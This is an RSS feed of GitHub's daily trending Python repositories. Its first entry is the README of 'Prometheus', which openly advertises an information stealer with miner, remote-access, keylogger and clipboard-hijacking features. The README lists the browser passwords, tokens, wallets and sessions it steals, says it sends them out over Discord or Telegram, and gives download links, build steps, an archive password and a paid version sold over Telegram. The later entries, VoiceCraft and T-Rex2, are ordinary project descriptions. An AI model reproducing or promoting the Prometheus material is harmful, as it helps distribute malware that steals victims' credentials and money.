<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-03-26T01:33:44Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>prometeydev/Prometheus</title>
    <updated>2024-03-26T01:33:44Z</updated>
    <id>tag:github.com,2024-03-26:/prometeydev/Prometheus</id>
    <link href="https://github.com/prometeydev/Prometheus" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Very powerful stealer + miner + rat + keylogger + clipper&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Prometheus&lt;/h1&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;div&gt; &#xA;  &lt;img src=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/logo.png&#34;&gt; &#xA; &lt;/div&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/languages/top/prometeydev/Prometheus&#34;&gt; &lt;br&gt; &lt;img src=&#34;https://img.shields.io/github/stars/prometeydev/Prometheus&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/forks/prometeydev/Prometheus&#34;&gt; &lt;br&gt; &lt;/p&gt;&#xA;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;&#xA;&lt;p align=&#34;center&#34;&gt;🔥 &lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/Prometheus.zip&#34;&gt;Download&lt;/a&gt; 🔥 &lt;br&gt; 💎 &lt;a href=&#34;https://t.me/PrometheusSupport&#34;&gt;Contact in Telegram&lt;/a&gt; 💎&lt;/p&gt; &#xA;&lt;hr style=&#34;border-radius: 2%; margin-top: 60px; margin-bottom: 60px;&#34; noshade size=&#34;20&#34; width=&#34;100%&#34;&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#download&#34;&gt;Download&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#stub-settings&#34;&gt;Stub Settings&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#requirements&#34;&gt;Requirements&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#how-to-build&#34;&gt;How to Build?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#vip-version&#34;&gt;VIP Version&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Download&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/Prometheus.zip&#34;&gt;Download&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/prometeydev/Prometheus/raw/main/window.png&#34;&gt; &lt;/p&gt; FREE Features &#xA;&lt;ul&gt; &#xA; &lt;li&gt;✅ GUI Builder.&lt;/li&gt; &#xA; &lt;li&gt;✅ Runs On Startup.&lt;/li&gt; &#xA; &lt;li&gt;✅ Fake Error.&lt;/li&gt; &#xA; &lt;li&gt;✅ EXE Binder.&lt;/li&gt; &#xA; &lt;li&gt;✅ File Pumper.&lt;/li&gt; &#xA; &lt;li&gt;✅ Obfuscated Code.&lt;/li&gt; &#xA; &lt;li&gt;✅ Discord Injection.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Discord Tokens.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Steam Session.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Epic Session.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Uplay Session.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Battle.Net Session.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Passwords From Many Browsers.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Cookies From Many Browsers.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals History From Many Browsers.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Autofills From Many Browsers.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Minecraft Session Files.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Telegram Session Files.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Crypto Wallets.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Roblox Cookies.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Growtopia Session.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals IP Information.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals System Info.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Saved Wifi Passwords.&lt;/li&gt; &#xA; &lt;li&gt;✅ Steals Common Files.&lt;/li&gt; &#xA; &lt;li&gt;✅ Captures Screenshot.&lt;/li&gt; &#xA; &lt;li&gt;✅ Captures Webcam Image.&lt;/li&gt; &#xA; &lt;li&gt;✅ Sends All Data Through Discord Webhooks/Telegram Bot.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;VIP Features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;💎 UAC Bypass.&lt;/li&gt; &#xA; &lt;li&gt;💎 Custom Icon.&lt;/li&gt; &#xA; &lt;li&gt;💎 Disables Windows Defender.&lt;/li&gt; &#xA; &lt;li&gt;💎 Melt Stub.&lt;/li&gt; &#xA; &lt;li&gt;💎 Anti-VM.&lt;/li&gt; &#xA; &lt;li&gt;💎 Recording Audio from a Microphone.&lt;/li&gt; &#xA; &lt;li&gt;💎 Blocks AV-Related Sites.&lt;/li&gt; &#xA; &lt;li&gt;💎 Steals Riot Session.&lt;/li&gt; &#xA; &lt;li&gt;💎 Crypt Stealer.&lt;/li&gt; &#xA; &lt;li&gt;💎 XMR Miner.&lt;/li&gt; &#xA; &lt;li&gt;💎 ETC Miner.&lt;/li&gt; &#xA; &lt;li&gt;💎 Steals Installed Software List.&lt;/li&gt; &#xA; &lt;li&gt;💎 Steals WhatsApp Session Files.&lt;/li&gt; &#xA; &lt;li&gt;💎 Uninstall Program.&lt;/li&gt; &#xA; &lt;li&gt;💎 RAT Mode.&lt;/li&gt; &#xA; &lt;li&gt;💎 Speak Text.&lt;/li&gt; &#xA; &lt;li&gt;💎 Open URL.&lt;/li&gt; &#xA; &lt;li&gt;💎 Encrypt User Files.&lt;/li&gt; &#xA; &lt;li&gt;💎 Kill Process.&lt;/li&gt; &#xA; &lt;li&gt;💎 Steals Startup List.&lt;/li&gt; &#xA; &lt;li&gt;💎 Keylogger.&lt;/li&gt; &#xA; &lt;li&gt;💎 Clipper.&lt;/li&gt; &#xA; &lt;li&gt;(...more)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Stub Settings&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/prometeydev/Prometheus/raw/main/msg.png&#34;&gt; &lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Option&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Ping Me&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Pings &lt;a href=&#34;https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone&#34;&gt;@everyone&lt;/a&gt; when someone runs the stub.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Anti VM&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Tries its best to prevent the stub from running on Virtual Machine.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Put On Startup&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Runs the stub on Windows startup.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Melt Stub&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Deletes the stub after use.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Pump Stub&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Pumps the stub up to the provided size.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Fake Error&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Create custom (fake) error.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Block AV Sites&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Blocks AV related sites.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;Discord Injection&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Puts backdoor on the Discord client for persistence.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;strong&gt;UAC Bypass&lt;/strong&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Tries to get administrator permissions without showing any prompt.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;strong&gt;Supports:&lt;/strong&gt; &lt;em&gt;Windows 7+&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;To build the stub, you need:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows 7+.&lt;/li&gt; &#xA; &lt;li&gt;Python 3.10.&lt;/li&gt; &#xA; &lt;li&gt;An active internet connection.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How to Build?&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download and install &lt;a href=&#34;https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe&#34;&gt;Python 3.10&lt;/a&gt; (NOT HIGHER! Make sure to enable the &lt;em&gt;Add to PATH&lt;/em&gt; option.)&lt;/li&gt; &#xA; &lt;li&gt;Verify the installation by executing &lt;code&gt;python --version&lt;/code&gt; in &lt;a href=&#34;https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?&#34;&gt;CMD&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/#download&#34;&gt;Download Prometheus&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file&#34;&gt;Extract&lt;/a&gt; the zip file.&lt;/li&gt; &#xA; &lt;li&gt;Navigate to the &lt;strong&gt;Prometheus&lt;/strong&gt; folder and double click &lt;em&gt;Builder.bat&lt;/em&gt; file.&lt;/li&gt; &#xA; &lt;li&gt;Fill in the fields of the builder and press the &lt;kbd&gt;Build&lt;/kbd&gt; button.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;P.S. Password from archive with logs &#34;prometheus&#34;&lt;/p&gt; &#xA;&lt;h2&gt;💎 VIP Version&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/prometeydev/Prometheus/raw/main/virustotal.png&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;💎 &lt;a href=&#34;https://raw.githubusercontent.com/prometeydev/Prometheus/main/PrometheusVIP.rar&#34;&gt;Download VIP&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;💎 If you want to get the password for the VIP version of Prometheus, you can buy it from me in &lt;a href=&#34;https://t.me/PrometheusSupport&#34;&gt;Telegram&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>jasonppy/VoiceCraft</title>
    <updated>2024-03-26T01:33:44Z</updated>
    <id>tag:github.com,2024-03-26:/jasonppy/VoiceCraft</id>
    <link href="https://github.com/jasonppy/VoiceCraft" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Zero-Shot Speech Editing and Text-to-Speech in the Wild&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;VoiceCraft: Zero-Shot Speech Editing and Text-to-Speech in the Wild&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://jasonppy.github.io/VoiceCraft_web&#34;&gt;Demo&lt;/a&gt; &lt;a href=&#34;https://jasonppy.github.io/assets/pdfs/VoiceCraft.pdf&#34;&gt;Paper&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;TL;DR&lt;/h3&gt; &#xA;&lt;p&gt;VoiceCraft is a token infilling neural codec language model, that achieves state-of-the-art performance on both &lt;strong&gt;speech editing&lt;/strong&gt; and &lt;strong&gt;zero-shot text-to-speech (TTS)&lt;/strong&gt; on in-the-wild data including audiobooks, internet videos, and podcasts.&lt;/p&gt; &#xA;&lt;p&gt;To clone or edit an unseen voice, VoiceCraft needs only a few seconds of reference.&lt;/p&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;p&gt;The TODOs left will be completed by the end of March 2024.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Codebase upload&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Environment setup&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Inference demo for speech editing and TTS&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Training guidance&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Upload the RealEdit dataset and training manifest&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Upload model weights (encodec weights are up)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Environment setup&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;conda create -n voicecraft python=3.9.16&#xA;conda activate voicecraft&#xA;&#xA;pip install torch==2.0.1 # this assumes your system is compatible with CUDA 11.7, otherwise checkout https://pytorch.org/get-started/previous-versions/#v201&#xA;apt-get install ffmpeg # if you don&#39;t already have ffmpeg installed&#xA;pip install -e git+https://github.com/facebookresearch/audiocraft.git@c5157b5bf14bf83449c17ea1eeb66c19fb4bc7f0#egg=audiocraft&#xA;apt-get install espeak-ng # backend for the phonemizer installed below&#xA;pip install tensorboard==2.16.2&#xA;pip install phonemizer==3.2.1&#xA;pip install torchaudio==2.0.2&#xA;pip install datasets==2.16.0&#xA;pip install torchmetrics==0.11.1&#xA;# install MFA for getting forced-alignment, this could take a few minutes&#xA;conda install -c conda-forge montreal-forced-aligner=2.2.17 openfst=1.8.2 kaldi=5.5.1068&#xA;# conda install pocl # above gives an warning for installing pocl, not sure if really need this&#xA;&#xA;# to run ipynb&#xA;conda install -n voicecraft ipykernel --update-deps --force-reinstall&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you have encountered version issues when running things, checkout &lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/environment.yml&#34;&gt;environment.yml&lt;/a&gt; for exact matching.&lt;/p&gt; &#xA;&lt;h2&gt;Inference Examples&lt;/h2&gt; &#xA;&lt;p&gt;Checkout &lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/inference_speech_editing.ipynb&#34;&gt;&lt;code&gt;inference_speech_editing.ipynb&lt;/code&gt;&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/inference_tts.ipynb&#34;&gt;&lt;code&gt;inference_tts.ipynb&lt;/code&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Training&lt;/h2&gt; &#xA;&lt;p&gt;To train an VoiceCraft model, you need to prepare the following parts:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;utterances and their transcripts&lt;/li&gt; &#xA; &lt;li&gt;encode the utterances into codes using e.g. Encodec&lt;/li&gt; &#xA; &lt;li&gt;convert transcripts into phoneme sequence, and a phoneme set (we named it vocab.txt)&lt;/li&gt; &#xA; &lt;li&gt;manifest (i.e. metadata)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Step 1,2,3 are handled in &lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/data/phonemize_encodec_encode_hf.py&#34;&gt;./data/phonemize_encodec_encode_hf.py&lt;/a&gt;, where&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Gigaspeech is downloaded through HuggingFace. Note that you need to sign an agreement in order to download the dataset (it needs your auth token)&lt;/li&gt; &#xA; &lt;li&gt;phoneme sequence and encodec codes are also extracted using the script.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;An example run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;conda activate voicecraft&#xA;export CUDA_VISIBLE_DEVICES=0&#xA;cd ./data&#xA;python phonemize_encodec_encode_hf.py \&#xA;--dataset_size xs \&#xA;--download_to path/to/store_huggingface_downloads \&#xA;--save_dir path/to/store_extracted_codes_and_phonemes \&#xA;--encodec_model_path path/to/encodec_model \&#xA;--mega_batch_size 120 \&#xA;--batch_size 32 \&#xA;--max_len 30000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;where encodec_model_path is avaliable &lt;a href=&#34;https://huggingface.co/pyp1/VoiceCraft&#34;&gt;here&lt;/a&gt;. This model is trained on Gigaspeech XL, it has 56M parameters, 4 codebooks, each codebook has 2048 codes. Details are described in our &lt;a href=&#34;https://jasonppy.github.io/assets/pdfs/VoiceCraft.pdf&#34;&gt;paper&lt;/a&gt;. If you encounter OOM during extraction, try decrease the batch_size and/or max_len. The extracted codes, phonemes, and vocab.txt will be stored at &lt;code&gt;path/to/store_extracted_codes_and_phonemes/${dataset_size}/{encodec_16khz_4codebooks,phonemes,vocab.txt}&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;As for manifest, please download train.txt and validation.txt from &lt;a href=&#34;https://huggingface.co/datasets/pyp1/VoiceCraft_RealEdit/tree/main&#34;&gt;here&lt;/a&gt;, and put them under &lt;code&gt;path/to/store_extracted_codes_and_phonemes/manifest/&lt;/code&gt;. Please also download vocab.txt from &lt;a href=&#34;https://huggingface.co/datasets/pyp1/VoiceCraft_RealEdit/tree/main&#34;&gt;here&lt;/a&gt; if you want to use our pretrained VoiceCraft model (so that the phoneme-to-token matching is the same).&lt;/p&gt; &#xA;&lt;p&gt;Now, you are good to start training!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;conda activate voicecraft&#xA;cd ./z_scripts&#xA;bash e830M.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;The codebase is under CC BY-NC-SA 4.0 (&lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/LICENSE-CODE&#34;&gt;LICENSE-CODE&lt;/a&gt;), and the model weights are under Coqui Public Model License 1.0.0 (&lt;a href=&#34;https://raw.githubusercontent.com/jasonppy/VoiceCraft/master/LICENSE-MODEL&#34;&gt;LICENSE-MODEL&lt;/a&gt;). Note that we use some of the code from other repository that are under different licenses: &lt;code&gt;./models/codebooks_patterns.py&lt;/code&gt; is under MIT license; &lt;code&gt;./models/modules&lt;/code&gt;, &lt;code&gt;./steps/optim.py&lt;/code&gt;, &lt;code&gt;data/tokenizer.py&lt;/code&gt; are under Apache License, Version 2.0; the phonemizer we used is under GNU 3.0 License. For drop-in replacement of the phonemizer (i.e. text to IPA phoneme mapping), try &lt;a href=&#34;https://github.com/roedoejet/g2p&#34;&gt;g2p&lt;/a&gt; (MIT License) or &lt;a href=&#34;https://github.com/NeuralVox/OpenPhonemizer&#34;&gt;OpenPhonemizer&lt;/a&gt; (BSD-3-Clause Clear), although these are not tested.&lt;/p&gt; &#xA;&lt;!-- How to use g2p to convert english text into IPA phoneme sequence&#xA;first install it with `pip install g2p`&#xA;```python&#xA;from g2p import make_g2p&#xA;transducer = make_g2p(&#39;eng&#39;, &#39;eng-ipa&#39;)&#xA;transducer(&#34;hello&#34;).output_string &#xA;# it will output: &#39;hʌloʊ&#39;&#xA;``` --&gt; &#xA;&lt;h2&gt;Acknowledgement&lt;/h2&gt; &#xA;&lt;p&gt;We thank Feiteng for his &lt;a href=&#34;https://github.com/lifeiteng/vall-e&#34;&gt;VALL-E reproduction&lt;/a&gt;, and we thank audiocraft team for open-sourcing &lt;a href=&#34;https://github.com/facebookresearch/audiocraft&#34;&gt;encodec&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{peng2024voicecraft,&#xA;  author    = {Peng, Puyuan and Huang, Po-Yao and Li, Daniel and Mohamed, Abdelrahman and Harwath, David},&#xA;  title     = {VoiceCraft: Zero-Shot Speech Editing and Text-to-Speech in the Wild},&#xA;  journal   = {arXiv},&#xA;  year      = {2024},&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;Any organization or individual is prohibited from using any technology mentioned in this paper to generate or edit someone&#39;s speech without his/her consent, including but not limited to government leaders, political figures, and celebrities. If you do not comply with this item, you could be in violation of copyright laws.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>IDEA-Research/T-Rex</title>
    <updated>2024-03-26T01:33:44Z</updated>
    <id>tag:github.com,2024-03-26:/IDEA-Research/T-Rex</id>
    <link href="https://github.com/IDEA-Research/T-Rex" rel="alternate"></link>
    <summary type="html">&lt;p&gt;T-Rex2: Towards Generic Object Detection via Text-Visual Prompt Synergy&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/head.jpg&#34; width=&#34;900&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt; A picture speaks volumes, as do the words that frame it.&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://img.shields.io/badge/T--Rex-2-2&#34; alt=&#34;Static Badge&#34;&gt; &lt;a href=&#34;https://arxiv.org/pdf/2403.14610.pdf&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/arxiv_2403.14610-blue%3Flog%3Darxiv&#34; alt=&#34;arXiv preprint&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://deepdataspace.com/home&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/homepage-visit-blue&#34; alt=&#34;Homepage&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hits.seeyoufarm.com&#34;&gt;&lt;img src=&#34;https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FMountchicken%2FT-Rex&amp;amp;count_bg=%2379C83D&amp;amp;title_bg=%23DF9B9B&amp;amp;icon=iconify.svg&amp;amp;icon_color=%23FFF9F9&amp;amp;title=VISITORS&amp;amp;edge_flat=false&#34; alt=&#34;Hits&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://deepdataspace.com/playground/ivp&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Try_Demo!-blue?logo=chainguard&amp;amp;logoColor=green&#34; alt=&#34;Static Badge&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;!-- Add demo video from youtube --&gt; &#xA;&lt;h1&gt;Introduction Video 🎥&lt;/h1&gt; &#xA;&lt;p&gt;Turn on the music if possible 🎧&lt;/p&gt; &#xA;&lt;!-- Add a video here --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Mountchicken/Union14M/assets/65173622/60be19f5-88e4-478e-b1a3-af62b8d6d177&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/assets/trex2/video_cover.jpg&#34; alt=&#34;Video Name&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Contents 📜&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#introduction-video-&#34;&gt;Introduction Video 🎥&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#contents-&#34;&gt;Contents 📜&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#1-introduction-&#34;&gt;1. Introduction 📚&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#what-can-t-rex-do-&#34;&gt;What Can T-Rex Do 📝&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#2-try-demo-&#34;&gt;2. Try Demo 🎮&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#3-api-usage-examples&#34;&gt;3. API Usage Examples📚&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#setup&#34;&gt;Setup&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#interactive-visual-prompt-api&#34;&gt;Interactive Visual Prompt API&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#generic-visual-prompt-api&#34;&gt;Generic Visual Prompt API&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#customize-visual-prompt-embedding-api&#34;&gt;Customize Visual Prompt Embedding API&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#embedding-inference-api&#34;&gt;Embedding Inference API&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#4-related-works&#34;&gt;4. Related Works&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/IDEA-Research/T-Rex/trex2/#bibtex-&#34;&gt;BibTeX 📚&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;1. Introduction 📚&lt;/h1&gt; &#xA;&lt;p&gt;Object detection, the ability to locate and identify objects within an image, is a cornerstone of computer vision, pivotal to applications ranging from autonomous driving to content moderation. A notable limitation of traditional object detection models is their closed-set nature. These models are trained on a predetermined set of categories, confining their ability to recognize only those specific categories. The training process itself is arduous, demanding expert knowledge, extensive datasets, and intricate model tuning to achieve desirable accuracy. Moreover, the introduction of a novel object category, exacerbates these challenges, necessitating the entire 